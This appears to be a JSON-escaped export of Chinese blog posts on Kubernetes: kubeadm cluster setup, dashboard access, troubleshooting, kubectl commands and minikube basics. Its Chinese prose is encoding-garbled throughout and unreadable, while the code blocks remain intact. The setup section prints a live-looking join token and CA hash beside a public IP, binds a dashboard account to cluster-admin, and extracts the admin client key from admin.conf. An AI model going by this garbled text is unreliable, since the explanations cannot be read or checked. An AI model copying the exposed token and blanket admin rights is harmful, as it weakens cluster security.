KUBECONFIG=/etc/kubernetes/admin.conf\n```\n\nå†æ¬¡è·å–å¯çœ‹åˆ°çŠ¶æ€\n\n```bash\nkubectl get nodes # æ­¤å¤„çš„NotReadyæ˜¯å› ä¸ºç½‘ç»œè¿˜æ²¡é…ç½®.\nNAME   STATUS     ROLES    AGE   VERSION\nus     NotReady   master   10m   v1.18.2\n```\n\n\n\n### 2.3 é…ç½®ç½‘ç»œ\n\né€‰ä¸€ä¸ªå³å¯\n\n+ å®‰è£…Calico\n\n```bash\nwget https://docs.projectcalico.org/v3.11/manifests/calico.yaml\n\n\n# calico.yaml æ–‡ä»¶æ·»åŠ ä»¥ä¸‹äºŒè¡Œ\n- name: IP_AUTODETECTION_METHOD\n\tvalue: \"interface=ens.*\"  # ens æ ¹æ®å®é™…ç½‘å¡å¼€å¤´é…ç½®\n\n\nkubectl delete -f calico.yaml\nkubectl apply -f calico.yaml\n```\n\n+ å®‰è£… flannel\n\n```bash\nwget https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml\n\nkubectl delete -f kube-flannel.yml\nkubectl apply -f kube-flannel.yml\n```\n\n\n\n### 2.4 æ·»åŠ WorkerèŠ‚ç‚¹\n\n```bash\n# è·å– nodes\nkubectl get nodes -o wide\n\n# åˆ é™¤ nodes\nkubectl delete nodes tencent\n\n# åœ¨è¢«åˆ é™¤çš„nodeèŠ‚ç‚¹æ¸…ç©ºé›†ç¾¤ä¿¡æ¯\nkubeadm reset\n\n# åœ¨masterèŠ‚ç‚¹æŸ¥çœ‹é›†ç¾¤çš„tokenå€¼(åœ¨ master æœºå™¨æ“ä½œ)\nkubeadm token create --print-join-command\n\n# å°†nodeèŠ‚ç‚¹é‡æ–°æ·»åŠ åˆ°k8sé›†ç¾¤ä¸­(åœ¨ node æœºå™¨æ“ä½œ)\nkubeadm join 10.128.0.2:6443 --token oa5h63.wylpy4upqzp5nxl4     --discovery-token-ca-cert-hash sha256:182bf7a949b7cad1511df0b38e340dde0196084522132ab6a32da1ae9e4c9d1a\n```\n\n\n\n# 3. åº”ç”¨éƒ¨ç½²\n\n### 3.1 nginx\n\n```bash\nvi nginx-pod.yaml\n\napiVersion: v1      # æè¿°æ–‡ä»¶æ‰€éµå¾ªKubernetesAPIçš„ç‰ˆæœ¬\nkind: Pod           # æè¿°çš„ç±»å‹æ˜¯pod\nmetadata:\n  name: nginx-pod   # podçš„åç§°\n  labels:           # æ ‡ç­¾\n    app: nginx-pod\n    env: test\nspec:\n  containers:\n    - name: nginx-pod     # å®¹å™¨å\n      image: nginx:1.15   # é•œåƒåç§°åŠç‰ˆæœ¬\n      imagePullPolicy: IfNotPresent   # å¦‚æœæœ¬åœ°ä¸å­˜åœ¨å°±å»è¿œç¨‹ä»“åº“æ‹‰å–\n      ports:\n        - containerPort: 80   # podå¯¹å¤–ç«¯å£\n  restartPolicy: Always\n```\nåº”ç”¨å’Œåˆ é™¤\n```bash\nkubectl apply -f nginx-pod.yaml  # åº”ç”¨\nkubectl delete -f nginx-pod.yaml # åˆ é™¤\n```\n\næ³¨æ„, nginx æ˜¯åœ¨ node èŠ‚ç‚¹ä¸Šé¢è¿è¡Œçš„, è€Œä¸æ˜¯ master, å¯ä»¥é€šè¿‡ docker ps æŸ¥çœ‹\n\n\n\n+ è®¿é—®nginx\n\n  æƒ³è¦è®¿é—®åˆ°podä¸­çš„æœåŠ¡, æœ€ç®€å•çš„æ–¹å¼å°±æ˜¯é€šè¿‡ç«¯å£è½¬å‘, æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤, å°†å®¿ä¸»æœºçš„`9999`ç«¯å£ä¸nginx-podçš„`80`ç«¯å£ç»‘å®š:\n\n  ```bash\n  kubectl port-forward --address 0.0.0.0 nginx-pod 9999:80\n  ```\n\n  ç„¶ååœ¨ master èº«ä¸Šè®¿é—®\n\n  ```bash\n  curl localhost:9999\n  ```\n\n  \n\n\n\n# 8. éƒ¨ç½²å›¾å½¢ç•Œé¢\n\n### 8.1 ä¸‹è½½\n\n  https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/\n\n```bash\nkubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.0/aio/deploy/recommended.yaml\n\nkubectl get pods --all-namespaces \n# éƒ¨ç½²å®Œæ¯•å, æ‰§è¡Œå¯ä»¥çœ‹åˆ°æœ‰ dashboard\n```\n\n\n\n### 8.2 åˆ›å»ºç”¨æˆ·\n\n+ vi dashboard-adminuser.yaml\n\n  æŒ‰ç…§ä¸‹é¢çš„å»å†™, å¦åˆ™å¯èƒ½æœ‰æƒé™é—®é¢˜\n\n```bash\napiVersion: v1\nkind: ServiceAccount\nmetadata:\n  name: admin-user\n  namespace: kube-system\n---\napiVersion: rbac.authorization.k8s.io/v1\nkind: ClusterRoleBinding\nmetadata:\n  name: admin-user\nroleRef:\n  apiGroup: rbac.authorization.k8s.io\n  kind: ClusterRole\n  name: cluster-admin\nsubjects:\n- kind: ServiceAccount\n  name: admin-user\n  namespace: kube-system\n```\n\n\n\n```bash\nkubectl apply -f dashboard-adminuser.yaml\n# æ˜¾ç¤º clusterrolebinding.rbac.authorization.k8s.io/admin-user created\n```\n\n\n\n### 8.3 è®¿é—®dashboard\n\nhttps://34.66.187.249:6443/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy\n\næŠ¥é”™  \"message\": \"services \\\"https:kubernetes-dashboard:\\\" is forbidden: User \\\"system:anonymous\\\" cannot get resource \\\"services/proxy\\\" in API group \\\"\\\" in the namespace \\\"kubernetes-dashboard\\\"\",\n\n\nè¿™ä¸ªæ˜¯å› ä¸ºkubernetesåŸºäºå®‰å…¨æ€§çš„è€ƒè™‘ï¼Œæµè§ˆå™¨å¿…é¡»è¦ä¸€ä¸ªæ ¹è¯ä¹¦ï¼Œé˜²æ­¢ä¸­é—´äººæ”»å‡»\n\n```bash\n# ç”Ÿæˆcrt\ngrep 'client-certificate-data' /etc/kubernetes/admin.conf | head -n 1 | awk '{print $2}' | base64 -d >> kubecfg.crt\n\n# ç”Ÿæˆkeyæ–‡ä»¶\ngrep 'client-key-data' /etc/kubernetes/admin.conf | head -n 1 | awk '{print $2}' | base64 -d >> kubecfg.key\n\n# ç”Ÿæˆp12è¯ä¹¦æ–‡ä»¶ï¼ˆè¯ä¹¦çš„ç”Ÿæˆå’Œå¯¼å…¥éœ€è¦ä¸€ä¸ªå¯†ç , å»ºè®®è¾“å…¥å¯†ç ï¼‰\nopenssl pkcs12 -export -clcerts -inkey kubecfg.key -in kubecfg.crt -out kubecfg.p12 -name \"kubernetes-client\"\n```\n\n\n\nkubecfg.p12å³éœ€è¦å¯¼å…¥å®¢æˆ·ç«¯æœºå™¨çš„è¯ä¹¦. å°†è¯ä¹¦æ‹·è´åˆ°å®¢æˆ·ç«¯æœºå™¨ä¸Š(è‡ªå·±çš„ç”µè„‘), å¯¼å…¥å³å¯(ç™»å½•é’¥åŒ™é“¾å¹¶ä¸”å§‹ç»ˆä¿¡ä»»). \nå†æ¬¡ç™»å½•æ—¶ä¼šæç¤ºé€‰æ‹©è¯ä¹¦, ç¡®è®¤åä¼šæç¤ºè¾“å…¥å½“å‰ç”¨æˆ·åå¯†ç (æ³¨æ„æ˜¯ç”µè„‘çš„ç”¨æˆ·åå¯†ç )\n\n```bash\n# æ‰§è¡Œ, å¤åˆ¶ token åˆ°æµè§ˆå™¨å³å¯\nkubectl -n kube-system describe secret $(kubectl -n kube-system get secret | grep admin-user | awk '{print $1}')\n```\n\n\n\n# 9. é”™è¯¯é—®é¢˜æ€»ç»“\n\n### 9.1 å¦‚ä½•åœæ­¢ kube-schedule\n\n```bash\nsystemctl stop kubelet\n```\n\n### 9.2 dashboardæ— æ³•æŸ¥çœ‹çš„é—®é¢˜\n\nnodes is forbidden: User \"system:serviceaccount:kubernetes-dashboard:kubernetes-dashboard\" cannot list resource \"nodes\" in API group \"\" at the cluster scope\n\nå…¶å®å¾ˆæ˜æ˜¾å°±æ˜¯ç”¨æˆ·system:serviceaccount:kubernetes-dashboard:kubernetes-dashboardæ²¡æœ‰ç›¸å…³æƒé™\n\nä¿®æ”¹dashboard-adminuser.yaml å¦‚ä¸Šæ–‡æ‰€ç¤ºå³å¯\n\n### 9.3 é•œåƒæ‹‰å–å¤±è´¥ GFW\n\nFailed to create pod sandbox: rpc error: code = Unknown desc = failed pulling image \"k8s.gcr.io/pause:3.1\": Error response from daemon: Get https://k8s.gcr.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)\n\nMountVolume.SetUp failed for volume \"kube-proxy\" : failed to sync configmap cache: timed out waiting for the condition\n\nFailed to pull image \"k8s.gcr.io/kube-proxy:v1.18.2\": rpc error: code = Unknown desc = Error response from daemon: Get https://k8s.gcr.io/v2/: net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)\n\n```bash\ndocker pull registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1\ndocker tag  registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.1 k8s.gcr.io/pause:3.1\n\ndocker pull registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy:v1.18.2 \ndocker tag  registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy:v1.18.2   k8s.gcr.io/kube-proxy:v1.18.2\n```\n\n### 9.4  calicoæ— æ³•å¯åŠ¨\n\n Readiness probe failed: calico/node is not ready: felix is not ready: Get http://localhost:9099/readiness: dial tcp 127.0.0.1:9099: connect: connection refused\n\nä¿®æ”¹calico.yaml, å¢åŠ `IP_AUTODETECTION_METHOD`ç¯å¢ƒå˜é‡, åœ¨ IP çš„ä¸‹é¢\n\n```bash\n- name: IP\n\tvalue: \"autodetect\"\n- name: IP_AUTODETECTION_METHOD\n\tvalue: \"interface=eth.*\"\n```\n\né‡å¯calico\n\n```bash\nkubectl delete -f calico.yaml\nkubectl apply -f calico.yaml\n```\n\n\n\n### 9.5 node æ— æ³• join\n\n [ERROR FileContentâ€“proc-sys-net-ipv4-ip_forward]: /proc/sys/net/ipv4/ip_forward contents are not set to 1\n\n```bash\necho 1 > /proc/sys/net/ipv4/ip_forward\n```\n\n\n\n# 10. å¸¸ç”¨å‘½ä»¤\n\n```bash\n# æŸ¥çœ‹çŠ¶æ€\nkubectl get nodes --all-namespaces -o wide\nkubectl get pods --all-namespaces -o wide\n\n\n# æŸ¥çœ‹ pod ä¿¡æ¯\nkubectl describe pods name\nkubectl describe pods -n kube-system name\n\n\n# è·å– token, åŠ å…¥\nkubeadm token create --print-join-command\n\n\n# æ¸…ç†\nkubeadm reset\nrm -rf /var/lib/cni/ && rm -rf /var/lib/calico/ && rm -rf /var/lib/kubelet/ && rm -rf /etc/cni/\nkubeadm init\n```\n\n\n\n# 11. å‚è€ƒæ•™ç¨‹\n\n+ https://kubernetes.io/docs/setup/production-environment/tools/kubeadm/install-kubeadm/\n+ https://juejin.im/post/5d7fb46d5188253264365dcf\n+ https://juejin.im/post/5e1e96ef6fb9a02fbd378588\n","tags":["k8s"],"categories":["k8s"]},{"title":"k8sçš„ä»‹ç»","url":"%2Fp%2F40c9599.html","content":"\n\n\n# 0. å‰è¨€\n\nå…ˆæ¥çœ‹ä¸€å¼  k8s æ¶æ„è®¾è®¡ä»¥åŠç»„ä»¶ä¹‹é—´çš„é€šä¿¡åè®®\n\n![1](k8sçš„ä»‹ç»/1.jpeg)\n\n<!-- more -->\n\n+ Master\n  \n  Master è´Ÿè´£ç®¡ç†æ•´ä¸ªé›†ç¾¤ã€‚Master åè°ƒé›†ç¾¤ä¸­çš„æ‰€æœ‰æ´»åŠ¨ï¼Œä¾‹å¦‚è°ƒåº¦åº”ç”¨ã€ç»´æŠ¤åº”ç”¨çš„æ‰€éœ€çŠ¶æ€ã€åº”ç”¨æ‰©å®¹ä»¥åŠæ¨å‡ºæ–°çš„æ›´æ–°ã€‚\n  \n  + APISERVER æ‰€æœ‰æœåŠ¡ç»Ÿä¸€å…¥å£\n  + RC ç»´æŒå‰¯æœ¬æœŸæœ›æ•°ç›®\n  + Scheduler è´Ÿè´£ä»‹ç»ä»»åŠ¡, é€‰æ‹©åˆé€‚çš„èŠ‚ç‚¹åˆ†é…ä»»åŠ¡ \n  + Etcd æŒä¹…åŒ–å­˜å‚¨ä¿¡æ¯\n  \n+ Node\n  \n  Nodeåœ¨ Kubernetes é›†ç¾¤ä¸­å……å½“å·¥ä½œæœºå™¨çš„è§’è‰²ã€‚å‘Šè¯‰ Master å¯åŠ¨åº”ç”¨å®¹å™¨ï¼Œ Master å°±ç¼–æ’å®¹å™¨åœ¨ç¾¤é›†çš„ Node ä¸Šè¿è¡Œã€‚ Node ä½¿ç”¨ Master æš´éœ²çš„ Kubernetes API ä¸ Master é€šä¿¡ã€‚\n  \n  + kubelet ç›´æ¥è·Ÿå®¹å™¨å¼•æ“(docker)äº¤äº’, å®ç°å®¹å™¨çš„ç”Ÿå‘½å‘¨æœŸç®¡ç†\n  + kube-proxy è´Ÿè´£å†™å…¥è§„åˆ™åˆ° IPTABLES, IPVS å®ç°æœåŠ¡æ˜ å°„è®¿é—®\n\n\n\n### 0.1 æŠ½è±¡è§†å›¾ï¼š\n\n![1](k8sçš„ä»‹ç»/2.png)\n\n\n\n### 0.2 Masteræ¶æ„:\n\n![1](k8sçš„ä»‹ç»/3.png)\n\n\n\n### 0.3 Nodeæ¶æ„:\n\n![1](k8sçš„ä»‹ç»/4.png)\n\n\n\n\n\n# 1. Pod\n\n### 1.1 è‡ªä¸»å¼ pod\n\npod é‡Œé¢çš„å®¹å™¨, é€šè¿‡ pause ç½‘ç»œå…±äº«å’Œæ–‡ä»¶å…±äº«\n\n### 1.2 æ§åˆ¶å™¨ç®¡ç†çš„ pod\n\n+ ReplicationController\n\n  å»ºè®®ç”¨ RSä»£æ›¿\n\n+ ReplicaSet\n\n  æ”¯æŒé›†åˆå¼çš„selector\n\n+ Deployment\n\n  è‡ªåŠ¨ç®¡ç† ReplicatSet\n\n  + HPA\n\n    å¼¹æ€§ä¼¸ç¼©, å¢åŠ æˆ–å‡å°‘ pod\n\n+ StatefulSet\n\n  è§£å†³æœ‰çŠ¶æ€æœåŠ¡çš„é—®é¢˜(Deploymentå’ŒReplicaSetæ˜¯æ— çŠ¶æ€æœåŠ¡)\n\n+ DaemonSet\n\n  ç¡®ä¿ Node è¿è¡Œ pod çš„å‰¯æœ¬\n\n+ Job, CronJob\n\n  è´Ÿè´£æ‰¹å¤„ç†ä»»åŠ¡\n\n\n\n# 3. ç½‘ç»œé€šä¿¡\n\n### 3.1 åŒä¸€ä¸ª pod\n\nå…±äº«ç½‘ç»œå‘½åç©ºé—´\n\n### 3.2 pod1, pod2\n\n+ åŒä¸€ä¸»æœº, docker0ç½‘æ®µ\n+ ä¸åŒä¸»æœº, podIP å’Œ nodeIP å…³è”èµ·æ¥(flannel)\n\n### 3.3 pod, service\n\n+ iptablesè½¬å‘å’Œç»´æŠ¤\n+ lvsè½¬å‘å’Œç»´æŠ¤\n\n### 3.4 pod, å¤–ç½‘\n\nè½¬å‘åˆ°å®¿ä¸»ä¸»æœºçš„ç½‘å¡\n\n### 3.5 å¤–ç½‘, pod\n\nservice, nodeport æ–¹å¼\n\n\n\n# 4. kubectl \n\n+ kubectl version \n\n  client  version æ˜¯kubectlçš„ç‰ˆæœ¬\n\n  server version æ˜¯ k8s çš„ç‰ˆæœ¬\n\n  \n\n+ kubectl get nodes\n\n  æŸ¥çœ‹æ‰€æœ‰çš„ node èŠ‚ç‚¹\n\n  \n\n+ kubectl get pods \n\n  æŸ¥çœ‹ pod èŠ‚ç‚¹\n\n  \n\n+ kubectl describe pods \n\n  æŸ¥çœ‹ pod çŠ¶æ€, ä¾‹å¦‚ ip , é‡Œé¢çš„å®¹å™¨ä¹‹ç±»çš„\n\n  \n\n+ kubectl describe services/kubernetes-bootcamp  \n\n  æŸ¥çœ‹servicesçŠ¶æ€\n\n  \n\n+ kubectl get services \n\n  æŸ¥çœ‹services\n\n\n\n+ kubectl expose deployment/kubernetes-bootcamp --type=\"NodePort\" --port 8080  \n\n  æ–°å»º service å¹¶æš´éœ²ç«¯å£\n\n  \n\n+ kubectl delete service -l run=kubernetes-bootcamp  \n\n  åˆ é™¤ä¸€ä¸ª service\n\n\n\n+ kubectl create deployment  åˆ›å»ºdeployment\n\n  kubectl create deployment kubernetes-bootcamp --image=gcr.io/google-samples/kubernetes-bootcamp:v1\n\n  \n\n+ kubectl get deployments\n\n  è·å–deployments\n\n\n\n+ kubectl describe deployment \n\n  æŸ¥çœ‹deployment\n\n  \n\n+ kubectl label pod $POD_NAME app=v1  \n\n  ç»™ pod åŠ ä¸ª lable\n\n  \n\n+ kubectl get pods -l app=v1  \n\n  åŠ å®Œ lable å°±èƒ½æŸ¥çœ‹äº†\n\n  \n\n+ kubectl get rs \n\n  æŸ¥çœ‹æ‹·è´åˆ—è¡¨\n\n  \n\n+ kubectl scale deployments/kubernetes-bootcamp --replicas=2  \n\n  ç›´æ¥å¤åˆ¶å“,ç‰›é€¼äº†\n\n  \n\n+ kubectl logs  æŸ¥çœ‹æ—¥å¿—\n\n  kubectl logs $POD_NAME\n\n  \n\n+ kubectl exec æ‰§è¡Œå‘½ä»¤\n\n  kubectl exec $POD_NAME env  æŸ¥çœ‹ç¯å¢ƒå˜é‡\n\n  kubectl exec -ti $POD_NAME bash  è¿›å…¥åˆ° pod é‡Œé¢\n\n  \n\n+ kubectl set image deployments/kubernetes-bootcamp kubernetes-bootcamp=gcr.io/google-samples/kubernetes-bootcamp:v10\n\n  æ›´æ¢ image\n\n  \n\n+ kubectl rollout status deployments/kubernetes-bootcamp \n\n  æŸ¥çœ‹çŠ¶æ€\n\n  \n\n+ kubectl rollout undo deployments/kubernetes-bootcamp  \n\n  å›æ»š\n\n\n\n\n\n# 5. é—®é¢˜è®°å½•\n\n+ minikubeæ˜¯å¹²å•¥çš„?\n\n   minikube æ˜¯ä¸€ç§è½»é‡çº§çš„ Kubernetes å®ç°ï¼Œå¯åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šåˆ›å»º VM å¹¶éƒ¨ç½²ä»…åŒ…å«ä¸€ä¸ªèŠ‚ç‚¹çš„ç®€å•é›†ç¾¤ã€‚\n\n  ç®€å•ç†è§£ä¸ºä¸€ä¸ªè¿è¡Œåœ¨æœ¬åœ°Nodeï¼Œæˆ‘ä»¬å¯ä»¥åœ¨é‡Œé¢åˆ›å»ºPodsæ¥åˆ›å»ºå¯¹åº”çš„æœåŠ¡.\n\n\n\n+ deploymentå’Œ podsçš„å…³ç³»\n\n  podæ˜¯å•ä¸€äº¦æˆ–ä¸€ç»„å®¹å™¨çš„åˆé›†, deploymentæ˜¯podç‰ˆæœ¬ç®¡ç†çš„å·¥å…· ç”¨æ¥åŒºåˆ†ä¸åŒç‰ˆæœ¬çš„pod, å¯ä»¥å›æ»šç‰ˆæœ¬\n\n  å•ç‹¬åˆ›å»ºpodçš„æ—¶å€™å°±ä¸ä¼šæœ‰deploymentå‡ºç°ï¼Œä½†æ˜¯åˆ›å»ºdeploymentçš„æ—¶å€™ä¸€å®šä¼šåˆ›å»ºpod,å› ä¸ºpodæ˜¯ä¸€ä¸ªåŸºç¡€çš„å•ä½ã€‚\n\n\n\n\n\n# 6. å‚è€ƒèµ„æ–™\n\n+ https://kubernetes.io/zh/docs/tutorials/hello-minikube/\n+ https://www.bookstack.cn/read/kubernetes-handbook/concepts-index.md\n+ https://www.bilibili.com/video/BV1w4411y7Go\n\n","tags":["k8s"],"categories":["k8s"]},{"title":"k8sçš„åˆæ¢","url":"%2Fp%2F890e8359.html","content":"\n# 0. å‰è¨€\n\nKubernetesä¸­çš„å¤§éƒ¨åˆ†æ¦‚å¿µNodeã€Podã€Replication Controllerã€Serviceç­‰éƒ½å¯ä»¥çœ‹ä½œä¸€ç§â€œèµ„æºå¯¹è±¡â€ï¼Œå‡ ä¹æ‰€æœ‰çš„èµ„æºå¯¹è±¡éƒ½å¯ä»¥é€šè¿‡kubectlå·¥å…·ï¼ˆAPIè°ƒç”¨ï¼‰æ‰§è¡Œå¢ã€åˆ ã€æ”¹ã€æŸ¥ç­‰æ“ä½œå¹¶å°†å…¶ä¿å­˜åœ¨etcdä¸­æŒä¹…åŒ–å­˜å‚¨ã€‚ä»è¿™ä¸ªè§’åº¦æ¥çœ‹ï¼Œkuberneteså…¶å®æ˜¯ä¸€ä¸ªé«˜åº¦è‡ªåŠ¨åŒ–çš„èµ„æºæ§åˆ¶ç³»ç»Ÿï¼Œé€šè¿‡è·Ÿè¸ªå¯¹æ¯”etcdåº“é‡Œä¿å­˜çš„â€œèµ„æºæœŸæœ›çŠ¶æ€â€ä¸å½“å‰ç¯å¢ƒä¸­çš„â€œå®é™…èµ„æºçŠ¶æ€â€çš„å·®å¼‚æ¥å®ç°è‡ªåŠ¨æ§åˆ¶å’Œè‡ªåŠ¨çº é”™çš„é«˜çº§åŠŸèƒ½ã€‚\n\n<!-- more -->\n\n\n# 1. Kubernetes æœ¬åœ°å®‰è£…\n\næˆ‘ä»¬éœ€è¦å®‰è£…ä»¥ä¸‹ä¸œè¥¿ï¼šKubernetes çš„å‘½ä»¤è¡Œå®¢æˆ·ç«¯ kubctlã€ä¸€ä¸ªå¯ä»¥åœ¨æœ¬åœ°è·‘èµ·æ¥çš„ Kubernetes ç¯å¢ƒ Minikubeã€‚\n\n### 1.1 å®‰è£… k8s\n\n```bash\ncat <<EOF > /etc/yum.repos.d/kubernetes.repo\n[kubernetes]\nname=Kubernetes\nbaseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64\nenabled=1\ngpgcheck=1\nrepo_gpgcheck=1\ngpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg\nexclude=kube*\nEOF\n\n\n\nyum install -y kubelet kubeadm kubectl --disableexcludes=kubernetes\nsystemctl enable kubelet && systemctl start kubelet\n```\n\n\n\n### 1.2 å®‰è£… minikube\n\nminikube æ˜¯ä¸€ç§è½»é‡çº§çš„ Kubernetes å®ç°ï¼Œå¯åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šåˆ›å»º VM å¹¶éƒ¨ç½²ä»…åŒ…å«ä¸€ä¸ªèŠ‚ç‚¹çš„ç®€å•é›†ç¾¤ã€‚ç®€å•ç†è§£ä¸ºä¸€ä¸ªè¿è¡Œåœ¨æœ¬åœ°Nodeï¼Œæˆ‘ä»¬å¯ä»¥åœ¨é‡Œé¢åˆ›å»ºPodsæ¥åˆ›å»ºå¯¹åº”çš„æœåŠ¡.\n\n```bash\ncurl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 \\\n   && sudo install minikube-linux-amd64 /usr/local/bin/minikube\n   \n   \nminikube start --vm-driver=none --image-repository=registry.cn-hangzhou.aliyuncs.com/google_containers\n```\n\n\n\nä¸ºä»€ä¹ˆå¢åŠ åé¢çš„image-repository, å› ä¸ºGFWæ€»æ˜¯ä¼šåœ¨æ— å½¢ä¸­å¢åŠ å­¦ä¹ çš„éš¾åº¦. è¯·å‚è€ƒ: https://github.com/kubernetes/minikube/issues/3860\n\n\n\nminikube å¯åŠ¨æ—¶ä¼šè‡ªåŠ¨é…ç½® kubectlï¼ŒæŠŠå®ƒæŒ‡å‘ Minikube æä¾›çš„ Kubernetes API æœåŠ¡ã€‚å¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤ç¡®è®¤ï¼š\n\n```bash\n$ kubectl config current-context\nminikube\n```\n\n\n\n# 2. ä½¿ç”¨\n\nå…¸å‹çš„ Kubernetes é›†ç¾¤åŒ…å«ä¸€ä¸ª master å’Œå¤šä¸ª nodeã€‚æ¯ä¸ª node ä¸Šè¿è¡Œç€ç»´æŠ¤ node çŠ¶æ€å¹¶å’Œ master é€šä¿¡çš„ kubeletã€‚ä½œä¸ºä¸€ä¸ªå¼€å‘å’Œæµ‹è¯•çš„ç¯å¢ƒï¼ŒMinikube ä¼šå»ºç«‹ä¸€ä¸ªæœ‰ä¸€ä¸ª node çš„é›†ç¾¤ï¼Œç”¨ä¸‹é¢çš„å‘½ä»¤å¯ä»¥çœ‹åˆ°ï¼š\n\n```bash\n$ kubectl get nodes\nNAME       STATUS    AGE       VERSION\nminikube   Ready     1h        v1.10.0\n```\n\n\n\n### 2.1 åˆ›å»º docker å®¹å™¨\n\n```bash\nmkdir html\necho '<h1>Hello Kubernetes!</h1>' > html/index.html\n```\n\n`Dockerfile`\n\n```dockerfile\nFROM nginx\nCOPY html/* /usr/share/nginx/html\n```\n\nåˆ›å»º:\n\n```bash\ndocker build -t k8s-demo:0.1 .\n```\n\n\n\n### 2.2 åˆ›å»ºpod\n\n`pod.yml`\n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n    name: k8s-demo\n    labels:\n     app: k8s-demo\nspec:\n    containers:\n        - name: k8s-demo\n          image: k8s-demo:0.1\n          ports:\n              - containerPort: 80\n```\nåˆ›å»º:\n\n```bash\nkubectl create -f pod.yml\n \n\nkubectl get pods\n# NAME       READY     STATUS    RESTARTS   AGE\n# k8s-demo   1/1       Running   0          5s\n\n\n# ä¿®æ”¹ pod.yml, å¹¶åº”ç”¨\nkubectl apply -f pod.yml\n```\n\n\n\nè™½ç„¶è¿™ä¸ª pod åœ¨è¿è¡Œï¼Œæˆ‘ä»¬æ— æ³•ä»å¤–éƒ¨ç›´æ¥è®¿é—®ã€‚è¦æŠŠæœåŠ¡æš´éœ²å‡ºæ¥ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ª Serviceã€‚Service çš„ä½œç”¨æœ‰ç‚¹åƒå»ºç«‹äº†ä¸€ä¸ªåå‘ä»£ç†å’Œè´Ÿè½½å‡è¡¡å™¨ï¼Œè´Ÿè´£æŠŠè¯·æ±‚åˆ†å‘ç»™åé¢çš„ podã€‚\n\n\n\n### 2.3 åˆ›å»ºservice\n\n`svc.yaml`\n\n```yaml\napiVersion: v1\nkind: Service\nmetadata:\n    name: k8s-demo-svc\n    labels:\n        app: k8s-demo\nspec:\n    type: NodePort\n    ports:\n        - port: 80\n          nodePort: 30050\n    selector:\n        app: k8s-demo\n```\n\nè¿™ä¸ª service ä¼šæŠŠå®¹å™¨çš„ 80 ç«¯å£ä» node çš„ 30050 ç«¯å£æš´éœ²å‡ºæ¥ã€‚\n\næ³¨æ„æ–‡ä»¶æœ€åä¸¤è¡Œçš„ selector éƒ¨åˆ†ï¼Œè¿™é‡Œå†³å®šäº†è¯·æ±‚ä¼šè¢«å‘é€ç»™é›†ç¾¤é‡Œçš„å“ªäº› podã€‚è¿™é‡Œçš„å®šä¹‰æ˜¯æ‰€æœ‰åŒ…å«ã€Œapp: k8s-demoã€è¿™ä¸ªæ ‡ç­¾çš„ podã€‚\n\n\n\næŸ¥çœ‹æ ‡ç­¾å‘½ä»¤:\n\n```bash\nkubectl describe pods | grep Labels\n```\n\n\n\nåˆ›å»º:\n\n```bash\nkubectl create -f svc.yml\n```\n\n\n\nç”¨ä¸‹é¢çš„å‘½ä»¤å¯ä»¥å¾—åˆ°æš´éœ²å‡ºæ¥çš„ URLï¼Œåœ¨æµè§ˆå™¨é‡Œè®¿é—®ï¼Œå°±èƒ½çœ‹åˆ°æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„ç½‘é¡µäº†ã€‚\n\n```bash\nminikube service k8s-demo-svc --url\n# http://10.0.0.5:30050\n\ncurl http://10.0.0.5:30050\n# Hello Kubernetes!\n```\n\n\n\n### 2.4 åˆ›å»º deployment\n\nåœ¨æ­£å¼ç¯å¢ƒä¸­æˆ‘ä»¬éœ€è¦è®©ä¸€ä¸ªæœåŠ¡ä¸å—å•ä¸ªèŠ‚ç‚¹æ•…éšœçš„å½±å“ï¼Œå¹¶ä¸”è¿˜è¦æ ¹æ®è´Ÿè½½å˜åŒ–åŠ¨æ€è°ƒæ•´èŠ‚ç‚¹æ•°é‡ï¼Œæ‰€ä»¥ä¸å¯èƒ½åƒä¸Šé¢ä¸€æ ·é€ä¸ªç®¡ç† podã€‚\n\nKubernetes çš„ç”¨æˆ·é€šå¸¸æ˜¯ç”¨ Deployment æ¥ç®¡ç†æœåŠ¡çš„ã€‚ä¸€ä¸ª deployment å¯ä»¥åˆ›å»ºæŒ‡å®šæ•°é‡çš„ pod éƒ¨ç½²åˆ°å„ä¸ª node ä¸Šï¼Œå¹¶å¯å®Œæˆæ›´æ–°ã€å›æ»šç­‰æ“ä½œã€‚\n\n`deployment.yml`\n\n```yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k8s-demo-deployment\nspec:\n  replicas: 10\n  minReadySeconds: 10\n  strategy:\n    type: RollingUpdate\n    rollingUpdate:\n      maxUnavailable: 1\n      maxSurge: 1\n  template:\n    metadata:\n      labels:\n        app: k8s-demo\n    spec:\n      containers:\n        - name: k8s-demo-pod\n          image: k8s-demo:0.1\n          ports:\n            - containerPort: 80\n  selector:\n    matchLabels:\n      app: k8s-demo\n```\n\nåˆ›å»º:\n\n```bash\nkubectl create -f deployment.yml\n\n# ç”¨ä¸‹é¢çš„å‘½ä»¤å¯ä»¥çœ‹åˆ°è¿™ä¸ª deployment çš„å‰¯æœ¬é›†ï¼ˆreplica setï¼‰ï¼Œæœ‰ 10 ä¸ª pod åœ¨è¿è¡Œã€‚\n\nkubectl get rs\n# NAME                             DESIRED   CURRENT   READY     AGE\n# k8s-demo-deployment-774878f86f   10        10        10        